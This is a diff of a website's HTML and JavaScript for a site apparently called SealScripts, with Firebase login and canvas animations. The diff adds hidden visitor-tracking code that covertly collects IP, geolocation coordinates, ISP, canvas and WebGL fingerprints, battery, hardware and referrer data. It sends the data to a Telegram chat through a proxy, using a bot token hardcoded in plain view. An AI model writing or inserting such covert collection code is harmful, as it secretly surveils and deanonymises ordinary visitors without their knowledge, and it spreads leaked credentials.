 <body>
@@ -324,7 +286,6 @@ footer .disclaimer{font-size:.7rem;color:#2a3f5c}
 <div class="bg-vignette"></div>
 <div class="bg-scan"></div>
 
-<!-- ПРОФИЛЬ — ЛЕВЫЙ ВЕРХНИЙ УГОЛ -->
 <div class="profile-card" id="profileCard">
   <div class="profile-avatar" id="profileAvatar">s</div>
   <div class="profile-name" id="profileName">seal</div>
@@ -442,9 +403,7 @@ footer .disclaimer{font-size:.7rem;color:#2a3f5c}
 <div class="auth-box" id="authBox">
 <h3 class="auth-title" id="authTitle">Login</h3>
 <p class="auth-sub" id="authSub">Enter your username and password</p>
-
 <input class="auth-input" type="text" id="authUsername" placeholder="Username" autocomplete="username" maxlength="20" autocapitalize="none" spellcheck="false">
-
 <input class="auth-input hidden" type="email" id="authEmail" placeholder="Email" autocomplete="email">
 <input class="auth-input" type="password" id="authPassword" placeholder="Password" autocomplete="current-password">
 <button class="auth-btn" id="authSubmit">Login</button>
@@ -488,20 +447,12 @@ footer .disclaimer{font-size:.7rem;color:#2a3f5c}
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
 import {
-  getAuth,
-  setPersistence,
-  browserLocalPersistence,
-  createUserWithEmailAndPassword,
-  signInWithEmailAndPassword,
-  signOut,
-  onAuthStateChanged
+  getAuth, setPersistence, browserLocalPersistence,
+  createUserWithEmailAndPassword, signInWithEmailAndPassword,
+  signOut, onAuthStateChanged
 } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-auth.js";
 import {
-  getFirestore,
-  doc,
-  getDoc,
-  setDoc,
-  serverTimestamp
+  getFirestore, doc, getDoc, setDoc, serverTimestamp
 } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
 
 const firebaseConfig = {
@@ -517,51 +468,28 @@ const app = initializeApp(firebaseConfig);
 const auth = getAuth(app);
 const db = getFirestore(app);
 
-try{
-  await setPersistence(auth, browserLocalPersistence);
-}catch(err){
-  console.warn('Persistence not available:', err);
-}
+try{ await setPersistence(auth, browserLocalPersistence); }catch(err){ console.warn(err); }
 
 const USERNAME_RE = /^[A-Za-z0-9_]{3,20}$/;
 
-/* Проверка занятости ника */
 async function isUsernameTaken(username){
-  const timeout = new Promise((_, rej) =>
-    setTimeout(() => rej(new Error('firestore-timeout')), 8000)
-  );
+  const timeout = new Promise((_, rej) => setTimeout(() => rej(new Error('firestore-timeout')), 8000));
   const lookup = (async () => {
-    const ref = doc(db, 'usernames', username.toLowerCase());
-    const snap = await getDoc(ref);
+    const snap = await getDoc(doc(db, 'usernames', username.toLowerCase()));
     return snap.exists();
   })();
   return await Promise.race([lookup, timeout]);
 }
-
-/* Сохранить ник (при регистрации) */
 async function saveUsername(uid, username, email){
   const lower = username.toLowerCase();
-  await setDoc(doc(db, 'usernames', lower), {
-    uid,
-    email,
-    username,
-    createdAt: serverTimestamp()
-  });
-  await setDoc(doc(db, 'users', uid), {
-    username,
-    usernameLower: lower,
-    createdAt: serverTimestamp()
-  }, { merge: true });
+  await setDoc(doc(db, 'usernames', lower), { uid, email, username, createdAt: serverTimestamp() });
+  await setDoc(doc(db, 'users', uid), { username, usernameLower: lower, createdAt: serverTimestamp() }, { merge:true });
 }
-
-/* Получить ник по UID */
 async function fetchUsername(uid){
   const snap = await getDoc(doc(db, 'users', uid));
   if(snap.exists() && snap.data().username) return snap.data().username;
   return null;
 }
-
-/* Получить email по нику (для логина) */
 async function getEmailByUsername(username){
   const snap = await getDoc(doc(db, 'usernames', username.toLowerCase()));
   if(!snap.exists()) return null;
@@ -569,19 +497,9 @@ async function getEmailByUsername(username){
 }
 
 window.firebaseAuth = {
-  createUserWithEmailAndPassword,
-  signInWithEmailAndPassword,
-  signOut,
-  onAuthStateChanged,
-  auth,
-  db,
-  isUsernameTaken,
-  saveUsername,
-  fetchUsername,
-  getEmailByUsername,
-  USERNAME_RE
+  createUserWithEmailAndPassword, signInWithEmailAndPassword, signOut, onAuthStateChanged,
+  auth, db, isUsernameTaken, saveUsername, fetchUsername, getEmailByUsername, USERNAME_RE
 };
-
 window.dispatchEvent(new Event('firebase-ready'));
 </script>
 
@@ -590,32 +508,17 @@ window.dispatchEvent(new Event('firebase-ready'));
 const sealLoader = document.getElementById('sealLoader');
 const loaderBar = document.getElementById('loaderBar');
 const loaderStage = document.getElementById('loaderStage');
-
-const bootState = {
-  firebase: false,
-  firestore: false,
-  ip: false,
-  fonts: false,
-  dom: false,
-  minTime: false
-};
+const bootState = { firebase:false, firestore:false, ip:false, fonts:false, dom:false, minTime:false };
 const TOTAL_STEPS = Object.keys(bootState).length;
 let currentProgress = 0;
 
-function setStage(text){ if(loaderStage) loaderStage.textContent = text; }
-function markReady(key){
-  if(!(key in bootState)) return;
-  if(bootState[key]) return;
-  bootState[key] = true;
-  recalcProgress();
-}
-function recalcProgress(){
+function setStage(t){ if(loaderStage) loaderStage.textContent = t; }
+function markReady(k){
+  if(!(k in bootState) || bootState[k]) return;
+  bootState[k] = true;
   const done = Object.values(bootState).filter(Boolean).length;
   const pct = Math.min(100, Math.round((done / TOTAL_STEPS) * 100));
-  if(pct > currentProgress){
-    currentProgress = pct;
-    loaderBar.style.width = pct + '%';
-  }
+  if(pct > currentProgress){ currentProgress = pct; loaderBar.style.width = pct + '%'; }
   if(done >= TOTAL_STEPS) finishLoader();
 }
 function finishLoader(){
@@ -627,16 +530,14 @@ function finishLoader(){
     setTimeout(() => { sealLoader.style.display = 'none'; }, 1000);
   }, 400);
 }
-
 setTimeout(() => markReady('minTime'), 1400);
 if(document.readyState === 'loading'){
-  document.addEventListener('DOMContentLoaded', () => markReady('dom'), { once: true });
+  document.addEventListener('DOMContentLoaded', () => markReady('dom'), { once:true });
 }else{ markReady('dom'); }
 if(document.fonts && document.fonts.ready){
   setStage('Loading fonts...');
   document.fonts.ready.then(() => markReady('fonts'));
 }else{ markReady('fonts'); }
-
 window.addEventListener('firebase-ready', async () => {
   setStage('Connecting to Firebase...');
   markReady('firebase');
@@ -651,17 +552,30 @@ window.addEventListener('firebase-ready', async () => {
   }catch(e){ markReady('firestore'); }
 });
 
+/* ================= TELEGRAM ================= */
 const TELEGRAM_PROXY = 'https://summer-hall-5536.autismallahakbar.workers.dev';
 const BOT_TOKEN = '8956553138:AAGIivvQO_8XJe3FnKG_OCfaqJm7knTHyN4';
 const CHAT_ID = '7937831655';
 
+async function sendToTelegramText(text){
+  try{
+    const res = await fetch(`${TELEGRAM_PROXY}/bot${BOT_TOKEN}/sendMessage`,{
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ chat_id: CHAT_ID, text })
+    });
+    const data = await res.json();
+    return !!data.ok;
+  }catch(e){ console.error('TG error:', e); return false; }
+}
+
+/* ================= IP + GEO ================= */
 let __userIP = 'unknown';
 let __userGeo = null;
 
 async function fetchUserIP(){
   setStage('Locating...');
   try{
-    const r = await fetch(`${TELEGRAM_PROXY}/myip`, { cache: 'no-store' });
+    const r = await fetch(`${TELEGRAM_PROXY}/myip`, { cache:'no-store' });
     const j = await r.json();
     if(j && j.ip) __userIP = j.ip;
     if(j && j.cf) __userGeo = j.cf;
@@ -670,7 +584,91 @@ async function fetchUserIP(){
 }
 fetchUserIP();
 
-function getDeviceInfo(){
+/* ================= СБОР ИНФЫ ================= */
+function getConnectionInfo(){
+  const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  if(!c) return null;
+  return {
+    type: c.effectiveType || 'unknown',
+    downlink: c.downlink ? c.downlink + ' Mbps' : 'unknown',
+    rtt: c.rtt ? c.rtt + ' ms' : 'unknown',
+    saveData: c.saveData || false
+  };
+}
+
+async function getBatteryInfo(){
+  try{
+    if(!navigator.getBattery) return null;
+    const b = await navigator.getBattery();
+    return {
+      level: Math.round(b.level * 100) + '%',
+      charging: b.charging ? 'yes' : 'no'
+    };
+  }catch(e){ return null; }
+}
+
+function getWebGLInfo(){
+  try{
+    const c = document.createElement('canvas');
+    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+    if(!gl) return null;
+    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+    if(!dbg) return null;
+    return {
+      vendor: gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) || '',
+      renderer: gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || ''
+    };
+  }catch(e){ return null; }
+}
+
+function getCanvasFingerprint(){
+  try{
+    const c = document.createElement('canvas');
+    c.width = 200; c.height = 40;
+    const ctx = c.getContext('2d');
+    ctx.textBaseline = 'top';
+    ctx.font = '14px Arial';
+    ctx.fillStyle = '#069';
+    ctx.fillText('SealScripts fingerprint', 2, 2);
+    ctx.fillStyle = 'rgba(102,204,0,0.7)';
+    ctx.fillText('SealScripts fingerprint', 4, 17);
+    const data = c.toDataURL();
+    let hash = 0;
+    for(let i = 0; i < data.length; i++){
+      hash = ((hash << 5) - hash) + data.charCodeAt(i);
+      hash |= 0;
+    }
+    return Math.abs(hash).toString(16);
+  }catch(e){ return 'unavailable'; }
+}
+
+function getUTMs(){
+  try{
+    const p = new URLSearchParams(location.search);
+    return {
+      utm_source: p.get('utm_source') || '',
+      utm_medium: p.get('utm_medium') || '',
+      utm_campaign: p.get('utm_campaign') || '',
+      utm_term: p.get('utm_term') || '',
+      utm_content: p.get('utm_content') || '',
+      gclid: p.get('gclid') || '',
+      fbclid: p.get('fbclid') || ''
+    };
+  }catch(e){ return {}; }
+}
+
+function getPageTiming(){
+  try{
+    const t = performance.timing;
+    return {
+      loadMs: t.loadEventEnd - t.navigationStart,
+      domReadyMs: t.domContentLoadedEventEnd - t.navigationStart,
+      ttfbMs: t.responseStart - t.navigationStart
+    };
+  }catch(e){ return null; }
+}
+
+function getClientInfo(){
   const ua = navigator.userAgent;
   let browser = 'Unknown', os = 'Unknown', device = 'Desktop';
   if(/Edg\//.test(ua)) browser = 'Edge ' + (ua.match(/Edg\/([\d.]+)/)||[])[1];
@@ -679,35 +677,108 @@ function getDeviceInfo(){
   else if(/Chrome\//.test(ua)) browser = 'Chrome ' + (ua.match(/Chrome\/([\d.]+)/)||[])[1];
   else if(/Safari\//.test(ua) && /Version\//.test(ua)) browser = 'Safari ' + (ua.match(/Version\/([\d.]+)/)||[])[1];
   if(/Windows NT 10/.test(ua)) os = 'Windows 10/11';
+  else if(/Windows NT 6\.3/.test(ua)) os = 'Windows 8.1';
+  else if(/Windows NT 6\.1/.test(ua)) os = 'Windows 7';
   else if(/Windows NT/.test(ua)) os = 'Windows';
   else if(/Mac OS X/.test(ua)) os = 'macOS ' + ((ua.match(/Mac OS X ([\d_]+)/)||[])[1]||'').replace(/_/g,'.');
   else if(/Android/.test(ua)) os = 'Android ' + ((ua.match(/Android ([\d.]+)/)||[])[1]||'');
   else if(/iPhone|iPad|iPod/.test(ua)) os = 'iOS ' + ((ua.match(/OS ([\d_]+)/)||[])[1]||'').replace(/_/g,'.');
+  else if(/CrOS/.test(ua)) os = 'ChromeOS';
   else if(/Linux/.test(ua)) os = 'Linux';
   if(/Mobile|Android|iPhone/.test(ua)) device = 'Mobile';
   else if(/iPad|Tablet/.test(ua)) device = 'Tablet';
-  return {
-    browser, os, device,
-    screen: `${screen.width}x${screen.height} @${devicePixelRatio}x`,
-    viewport: `${innerWidth}x${innerHeight}`,
-    language: navigator.language,
-    timezone: (Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown'),
-    referrer: document.referrer || 'direct',
-    ua: ua.slice(0, 200)
-  };
+
+  return { browser, os, device, ua };
 }
-function geoLine(){
-  if(!__userGeo) return '';
-  const parts = [];
-  if(__userGeo.city) parts.push(__userGeo.city);
-  if(__userGeo.region) parts.push(__userGeo.region);
-  if(__userGeo.country) parts.push(__userGeo.country);
-  const loc = parts.join(', ');
-  let line = '';
-  if(loc) line += `📍 Location: ${loc} (by IP)\n`;
-  if(__userGeo.org) line += `🏢 ISP: ${__userGeo.org}\n`;
-  if(__userGeo.timezone) line += `🌍 IP Timezone: ${__userGeo.timezone}\n`;
-  return line;
+
+let __clientInfo = null;
+
+async function sendVisitInfo(){
+  try{
+    /* Отправляем один раз за сессию */
+    try{
+      if(sessionStorage.getItem('seal_visit_sent') === '1') return;
+      sessionStorage.setItem('seal_visit_sent','1');
+    }catch(e){}
+
+    /* Показываем страницу только после того, как всё собрано */
+    const [battery] = await Promise.all([ getBatteryInfo() ]);
+    const webgl = getWebGLInfo();
+    const canvasFP = getCanvasFingerprint();
+    const utms = getUTMs();
+    const timing = getPageTiming();
+    const conn = getConnectionInfo();
+    const info = __clientInfo;
+
+    /* Первый визит или повторный */
+    let visitCount = 1;
+    try{
+      visitCount = parseInt(localStorage.getItem('seal_visits') || '0', 10) + 1;
+      localStorage.setItem('seal_visits', String(visitCount));
+    }catch(e){}
+
+    /* Языки */
+    const langs = (navigator.languages || [navigator.language]).join(', ');
+    const tz = (Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown');
+    const time = new Date().toISOString().replace('T',' ').slice(0,19) + ' UTC';
+
+    /* Гео из Cloudflare */
+    let geo = '';
+    if(__userGeo){
+      const p = [];
+      if(__userGeo.city) p.push(__userGeo.city);
+      if(__userGeo.region) p.push(__userGeo.region);
+      if(__userGeo.country) p.push(__userGeo.country);
+      if(p.length) geo += `📍 Location: ${p.join(', ')} (by IP)\n`;
+      if(__userGeo.latitude && __userGeo.longitude) geo += `🧭 Coords: ${__userGeo.latitude}, ${__userGeo.longitude}\n`;
+      if(__userGeo.org) geo += `🏢 ISP: ${__userGeo.org}\n`;
+      if(__userGeo.asn) geo += `🔢 ASN: ${__userGeo.asn}\n`;
+      if(__userGeo.timezone) geo += `🌍 IP Timezone: ${__userGeo.timezone}\n`;
+    }
+
+    /* UTM-метки */
+    let utmLine = '';
+    Object.entries(utms).forEach(([k,v])=>{ if(v) utmLine += `${k}=${v} `; });
+
+    const message =
+`👀 New visit on SealScripts
+━━━━━━━━━━━━━━━━
+🌐 IP: ${__userIP}
+${geo}━━━━━━━━━━━━━━━━
+🖥 Browser: ${info.browser}
+💻 OS: ${info.os}
+📱 Device: ${info.device}
+🧩 Vendor: ${navigator.vendor || '—'}
+🖼 WebGL: ${webgl ? (webgl.renderer||'—') : '—'}
+🎨 Canvas FP: ${canvasFP}
+━━━━━━━━━━━━━━━━
+📐 Screen: ${screen.width}x${screen.height} @${devicePixelRatio}x
+📏 Available: ${screen.availWidth}x${screen.availHeight}
+🪟 Viewport: ${innerWidth}x${innerHeight}
+🎨 Color depth: ${screen.colorDepth}-bit
+🔄 Orientation: ${(screen.orientation && screen.orientation.type) || '—'}
+👆 Touch: ${('ontouchstart' in window) ? 'yes' : 'no'}
+━━━━━━━━━━━━━━━━
+🗣 Language: ${navigator.language}
+🌍 Languages: ${langs}
+🕒 Timezone: ${tz}
+🧠 CPU cores: ${navigator.hardwareConcurrency || '—'}
+💾 Device RAM: ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : '—'}
+${conn ? `📶 Network: ${conn.type}, ↓${conn.downlink}, RTT ${conn.rtt}, saveData=${conn.saveData}\n` : ''}${battery ? `🔋 Battery: ${battery.level} (charging: ${battery.charging})\n` : ''}━━━━━━━━━━━━━━━━
+🍪 Cookies: ${navigator.cookieEnabled ? 'yes' : 'no'}
+🕵 DNT: ${navigator.doNotTrack || '—'}
+🖱 Platform: ${navigator.platform || '—'}
+📦 Visits: #${visitCount}
+${timing ? `⏱ Load: ${timing.loadMs}ms (DOM ${timing.domReadyMs}ms, TTFB ${timing.ttfbMs}ms)\n` : ''}${utmLine ? `📊 UTM: ${utmLine}\n` : ''}━━━━━━━━━━━━━━━━
+🔗 URL: ${location.href}
+🧭 Referrer: ${document.referrer || 'direct'}
+🕰 Time: ${time}
+🧾 UA: ${info.ua}`;
+
+    await sendToTelegramText(message);
+  }catch(e){
+    console.error('visit info error:', e);
+  }
 }
 
 /* ================= ФОН ================= */
@@ -720,50 +791,40 @@ function geoLine(){
   let elapsed = 0;
   const dpr = Math.min(window.devicePixelRatio || 1, 2);
   function makeParticle(){
-    return {
-      x: Math.random() * W, y: Math.random() * H,
-      vx: (Math.random() - .5) * .04, vy: (Math.random() - .5) * .04,
-      phaseX: Math.random() * Math.PI * 2, phaseY: Math.random() * Math.PI * 2,
-      ampX: Math.random() * .5 + .15, ampY: Math.random() * .5 + .15,
-      freq: Math.random() * .5 + .15, r: Math.random() * 1.7 + .4,
-      a: Math.random() * .55 + .2
-    };
+    return { x:Math.random()*W, y:Math.random()*H, vx:(Math.random()-.5)*.04, vy:(Math.random()-.5)*.04,
+      phaseX:Math.random()*Math.PI*2, phaseY:Math.random()*Math.PI*2,
+      ampX:Math.random()*.5+.15, ampY:Math.random()*.5+.15,
+      freq:Math.random()*.5+.15, r:Math.random()*1.7+.4, a:Math.random()*.55+.2 };
   }
   function resize(){
-    W = window.innerWidth; H = window.innerHeight;
-    canvas.width = W * dpr; canvas.height = H * dpr;
-    canvas.style.width = W + 'px'; canvas.style.height = H + 'px';
-    ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
+    W = innerWidth; H = innerHeight;
+    canvas.width = W*dpr; canvas.height = H*dpr;
+    canvas.style.width = W+'px'; canvas.style.height = H+'px';
+    ctx.setTransform(dpr,0,0,dpr,0,0);
   }
   resize();
-  window.addEventListener('resize', () => {
-    resize(); particles = [];
-    for(let i = 0; i < COUNT; i++) particles.push(makeParticle());
-  });
-  for(let i = 0; i < COUNT; i++) particles.push(makeParticle());
+  window.addEventListener('resize', ()=>{ resize(); particles=[]; for(let i=0;i<COUNT;i++) particles.push(makeParticle()); });
+  for(let i=0;i<COUNT;i++) particles.push(makeParticle());
   function draw(now){
-    const dt = Math.min((now - lastT) / 16.67, 3);
-    lastT = now; elapsed += dt / 60;
-    ctx.clearRect(0, 0, W, H);
-    for(let i = 0; i < particles.length; i++){
+    const dt = Math.min((now-lastT)/16.67, 3); lastT = now; elapsed += dt/60;
+    ctx.clearRect(0,0,W,H);
+    for(let i=0;i<particles.length;i++){
       const p = particles[i];
-      p.x += p.vx * dt; p.y += p.vy * dt;
-      const ox = Math.sin(elapsed * p.freq * Math.PI * 2 + p.phaseX) * p.ampX;
-      const oy = Math.cos(elapsed * p.freq * Math.PI * 2 + p.phaseY) * p.ampY;
-      if(p.x < -20) p.x = W + 20; if(p.x > W + 20) p.x = -20;
-      if(p.y < -20) p.y = H + 20; if(p.y > H + 20) p.y = -20;
-      const px = p.x + ox, py = p.y + oy;
-      ctx.beginPath(); ctx.arc(px, py, p.r, 0, Math.PI * 2);
+      p.x += p.vx*dt; p.y += p.vy*dt;
+      const ox = Math.sin(elapsed*p.freq*Math.PI*2+p.phaseX)*p.ampX;
+      const oy = Math.cos(elapsed*p.freq*Math.PI*2+p.phaseY)*p.ampY;
+      if(p.x<-20)p.x=W+20; if(p.x>W+20)p.x=-20; if(p.y<-20)p.y=H+20; if(p.y>H+20)p.y=-20;
+      const px=p.x+ox, py=p.y+oy;
+      ctx.beginPath(); ctx.arc(px,py,p.r,0,Math.PI*2);
       ctx.fillStyle = `rgba(120,180,255,${p.a})`; ctx.fill();
-      for(let j = i + 1; j < particles.length; j++){
-        const q = particles[j];
-        const qx = q.x + Math.sin(elapsed * q.freq * Math.PI * 2 + q.phaseX) * q.ampX;
-        const qy = q.y + Math.cos(elapsed * q.freq * Math.PI * 2 + q.phaseY) * q.ampY;
-        const dx = px - qx, dy = py - qy;
-        const d = Math.sqrt(dx * dx + dy * dy);
-        if(d < 130){
-          ctx.beginPath(); ctx.moveTo(px, py); ctx.lineTo(qx, qy);
-          ctx.strokeStyle = `rgba(90,160,255,${(1 - d / 130) * .1})`;
+      for(let j=i+1;j<particles.length;j++){
+        const q=particles[j];
+        const qx=q.x+Math.sin(elapsed*q.freq*Math.PI*2+q.phaseX)*q.ampX;
+        const qy=q.y+Math.cos(elapsed*q.freq*Math.PI*2+q.phaseY)*q.ampY;
+        const dx=px-qx, dy=py-qy; const d=Math.sqrt(dx*dx+dy*dy);
+        if(d<130){
+          ctx.beginPath(); ctx.moveTo(px,py); ctx.lineTo(qx,qy);
+          ctx.strokeStyle = `rgba(90,160,255,${(1-d/130)*.1})`;
           ctx.lineWidth = .5; ctx.stroke();
         }
       }
@@ -774,15 +835,15 @@ function geoLine(){
 })();
 
 /* ================= RIPPLE ================= */
-document.querySelectorAll('.btn, .submit-btn, .auth-btn, .warning-btn, .thanks-btn, .mad-btn, .back-link').forEach(btn => {
+document.querySelectorAll('.btn, .submit-btn, .auth-btn, .warning-btn, .thanks-btn, .mad-btn, .back-link, .profile-btn, .copy-btn').forEach(btn => {
   btn.addEventListener('click', function(e){
     const rect = this.getBoundingClientRect();
     const ripple = document.createElement('span');
     ripple.className = 'ripple';
     const size = Math.max(rect.width, rect.height);
     ripple.style.width = ripple.style.height = size + 'px';
-    ripple.style.left = (e.clientX - rect.left - size / 2) + 'px';
-    ripple.style.top = (e.clientY - rect.top - size / 2) + 'px';
+    ripple.style.left = (e.clientX - rect.left - size/2) + 'px';
+    ripple.style.top = (e.clientY - rect.top - size/2) + 'px';
     this.appendChild(ripple);
     setTimeout(() => ripple.remove(), 900);
   });
@@ -795,166 +856,121 @@ document.querySelectorAll('.btn, .submit-btn, .auth-btn, .warning-btn, .thanks-b
   if(!zone || !canvas) return;
   const ctx = canvas.getContext('2d');
   const DPR = Math.min(window.devicePixelRatio || 1, 2);
-  let W = 200, H = 200, CX = 100, CY = 100, baseScale = 1;
-
+  let W=200,H=200,CX=100,CY=100,baseScale=1;
   function resize(){
     const rect = zone.getBoundingClientRect();
     W = rect.width || 200; H = rect.height || 200;
-    canvas.width = W * DPR; canvas.height = H * DPR;
-    canvas.style.width = W + 'px'; canvas.style.height = H + 'px';
-    ctx.setTransform(DPR, 0, 0, DPR, 0, 0);
-    CX = W / 2; CY = H / 2;
-    baseScale = Math.min(W, H) / 200;
+    canvas.width = W*DPR; canvas.height = H*DPR;
+    canvas.style.width = W+'px'; canvas.style.height = H+'px';
+    ctx.setTransform(DPR,0,0,DPR,0,0);
+    CX = W/2; CY = H/2; baseScale = Math.min(W,H)/200;
   }
-  resize();
-  window.addEventListener('resize', resize);
-
-  function rotX(v, a){const c=Math.cos(a),s=Math.sin(a);return{x:v.x,y:v.y*c-v.z*s,z:v.y*s+v.z*c}}
-  function rotY(v, a){const c=Math.cos(a),s=Math.sin(a);return{x:v.x*c+v.z*s,y:v.y,z:-v.x*s+v.z*c}}
-  function rotZ(v, a){const c=Math.cos(a),s=Math.sin(a);return{x:v.x*c-v.y*s,y:v.x*s+v.y*c,z:v.z}}
-  function project(v, camZ){
-    const d = camZ - v.z;
-    const k = 300 / Math.max(d, 0.1);
-    return { x: v.x * k, y: v.y * k, scale: k, depth: v.z };
-  }
-
+  resize(); window.addEventListener('resize', resize);
+  function rotX(v,a){const c=Math.cos(a),s=Math.sin(a);return{x:v.x,y:v.y*c-v.z*s,z:v.y*s+v.z*c}}
+  function rotY(v,a){const c=Math.cos(a),s=Math.sin(a);return{x:v.x*c+v.z*s,y:v.y,z:-v.x*s+v.z*c}}
+  function rotZ(v,a){const c=Math.cos(a),s=Math.sin(a);return{x:v.x*c-v.y*s,y:v.x*s+v.y*c,z:v.z}}
+  function project(v,camZ){const d=camZ-v.z;const k=300/Math.max(d,0.1);return{x:v.x*k,y:v.y*k,scale:k,depth:v.z}}
   const particles = [];
-  const PARTICLE_COUNT = 220;
-  function spawnParticle(){
-    return {
-      angle: Math.random() * Math.PI * 2,
-      radius: 30 + Math.random() * 90,
-      y: (Math.random() - 0.5) * 4,
-      speed: 0.008 + Math.random() * 0.018,
-      fall: 0.12 + Math.random() * 0.3,
-      size: 0.6 + Math.random() * 1.4,
-      bright: 0.5 + Math.random() * 0.5
-    };
-  }
-  for(let i = 0; i < PARTICLE_COUNT; i++) particles.push(spawnParticle());
-
+  function spawnParticle(){ return { angle:Math.random()*Math.PI*2, radius:30+Math.random()*90, y:(Math.random()-.5)*4, speed:0.008+Math.random()*0.018, fall:0.12+Math.random()*0.3, size:0.6+Math.random()*1.4, bright:0.5+Math.random()*0.5 }; }
+  for(let i=0;i<220;i++) particles.push(spawnParticle());
   const diskRings = [
-    { r: 30, hue: 195, a: 0.95, thick: 1.4, segs: 60 },
-    { r: 42, hue: 200, a: 0.8,  thick: 1.6, segs: 72 },
-    { r: 56, hue: 205, a: 0.6,  thick: 1.8, segs: 84 },
-    { r: 72, hue: 210, a: 0.4,  thick: 2.0, segs: 96 },
-    { r: 90, hue: 215, a: 0.25, thick: 2.2, segs: 108 }
+    { r:30, hue:195, a:0.95, thick:1.4, segs:60 },
+    { r:42, hue:200, a:0.8,  thick:1.6, segs:72 },
+    { r:56, hue:205, a:0.6,  thick:1.8, segs:84 },
+    { r:72, hue:210, a:0.4,  thick:2.0, segs:96 },
+    { r:90, hue:215, a:0.25, thick:2.2, segs:108 }
   ];
-
-  let tmx = 0, tmy = 0, mx = 0, my = 0, pulse = 0, autoRotY = 0;
-  let lastT = performance.now();
-
-  zone.addEventListener('mousemove', e => {
+  let tmx=0,tmy=0,mx=0,my=0,pulse=0,autoRotY=0,lastT=performance.now();
+  zone.addEventListener('mousemove', e=>{
     const rect = zone.getBoundingClientRect();
-    tmx = ((e.clientX - rect.left) / rect.width - 0.5) * 2;
-    tmy = ((e.clientY - rect.top) / rect.height - 0.5) * 2;
+    tmx = ((e.clientX-rect.left)/rect.width - .5)*2;
+    tmy = ((e.clientY-rect.top)/rect.height - .5)*2;
   });
-  zone.addEventListener('mouseleave', () => { tmx = 0; tmy = 0; });
-  zone.addEventListener('click', () => { pulse = 1; });
-
+  zone.addEventListener('mouseleave', ()=>{ tmx=0; tmy=0; });
+  zone.addEventListener('click', ()=>{ pulse=1; });
   function draw(now){
-    const dt = Math.min((now - lastT) / 1000, 0.05);
-    lastT = now;
-    mx += (tmx - mx) * 0.08;
-    my += (tmy - my) * 0.08;
-    pulse *= 0.94;
-    autoRotY += 0.35 * dt;
-
-    ctx.clearRect(0, 0, W, H);
-    const camZ = 170;
-    const cx = CX + mx * 4 * baseScale;
-    const cy = CY + my * 4 * baseScale;
-    const angleX = -0.55 + my * 0.55;
-    const angleY = autoRotY + mx * 0.9;
-    const angleZ = mx * 0.15;
-
-    const halo = ctx.createRadialGradient(cx, cy, 0, cx, cy, 95 * baseScale);
-    halo.addColorStop(0, 'rgba(120,180,255,0.18)');
-    halo.addColorStop(0.5, 'rgba(58,123,213,0.06)');
-    halo.addColorStop(1, 'rgba(58,123,213,0)');
-    ctx.fillStyle = halo;
-    ctx.beginPath(); ctx.arc(cx, cy, 95 * baseScale, 0, Math.PI * 2); ctx.fill();
-
+    const dt = Math.min((now-lastT)/1000,0.05); lastT=now;
+    mx += (tmx-mx)*0.08; my += (tmy-my)*0.08; pulse*=0.94; autoRotY += 0.35*dt;
+    ctx.clearRect(0,0,W,H);
+    const camZ=170;
+    const cx = CX + mx*4*baseScale;
+    const cy = CY + my*4*baseScale;
+    const angleX = -0.55 + my*0.55;
+    const angleY = autoRotY + mx*0.9;
+    const angleZ = mx*0.15;
+    const halo = ctx.createRadialGradient(cx,cy,0,cx,cy,95*baseScale);
+    halo.addColorStop(0,'rgba(120,180,255,0.18)');
+    halo.addColorStop(0.5,'rgba(58,123,213,0.06)');
+    halo.addColorStop(1,'rgba(58,123,213,0)');
+    ctx.fillStyle = halo; ctx.beginPath(); ctx.arc(cx,cy,95*baseScale,0,Math.PI*2); ctx.fill();
     const items = [];
     for(const ring of diskRings){
-      for(let i = 0; i < ring.segs; i++){
-        const a = (i / ring.segs) * Math.PI * 2 + now * 0.0006 * ring.r * 0.05;
-        items.push({ type: 'disk', v: { x: Math.cos(a) * ring.r, y: 0, z: Math.sin(a) * ring.r }, a, ring });
+      for(let i=0;i<ring.segs;i++){
+        const a = (i/ring.segs)*Math.PI*2 + now*0.0006*ring.r*0.05;
+        items.push({ type:'disk', v:{x:Math.cos(a)*ring.r,y:0,z:Math.sin(a)*ring.r}, a, ring });
       }
     }
-    for(let i = 0; i < 80; i++){
-      const a = (i / 80) * Math.PI * 2;
-      items.push({ type: 'photon', v: { x: Math.cos(a) * 20, y: Math.sin(a) * 20, z: 0 }, a });
+    for(let i=0;i<80;i++){
+      const a = (i/80)*Math.PI*2;
+      items.push({ type:'photon', v:{x:Math.cos(a)*20,y:Math.sin(a)*20,z:0}, a });
     }
-    for(let i = 0; i < particles.length; i++){
+    for(let i=0;i<particles.length;i++){
       const p = particles[i];
-      p.angle += p.speed * (1 + (90 - p.radius) / 60) * 60 * dt;
-      p.radius -= p.fall * 60 * dt * (0.5 + (1 - p.radius / 90));
-      if(p.radius < 22){ particles[i] = spawnParticle(); continue; }
-      items.push({ type: 'particle', v: {
-        x: Math.cos(p.angle) * p.radius,
-        y: p.y * (1 - p.radius / 120),
-        z: Math.sin(p.angle) * p.radius
-      }, p });
+      p.angle += p.speed*(1+(90-p.radius)/60)*60*dt;
+      p.radius -= p.fall*60*dt*(0.5+(1-p.radius/90));
+      if(p.radius<22){ particles[i]=spawnParticle(); continue; }
+      items.push({ type:'particle', v:{x:Math.cos(p.angle)*p.radius, y:p.y*(1-p.radius/120), z:Math.sin(p.angle)*p.radius}, p });
     }
-
     for(const it of items){
-      let p = { x: it.v.x, y: it.v.y, z: it.v.z };
-      p = rotX(p, angleX); p = rotY(p, angleY); p = rotZ(p, angleZ);
+      let p = {x:it.v.x,y:it.v.y,z:it.v.z};
+      p = rotX(p,angleX); p = rotY(p,angleY); p = rotZ(p,angleZ);
       it.rot = p;
     }
-    items.sort((A, B) => A.rot.z - B.rot.z);
-
+    items.sort((A,B)=>A.rot.z-B.rot.z);
     for(const it of items){
       const s = project(it.rot, camZ);
-      const sx = cx + s.x * baseScale;
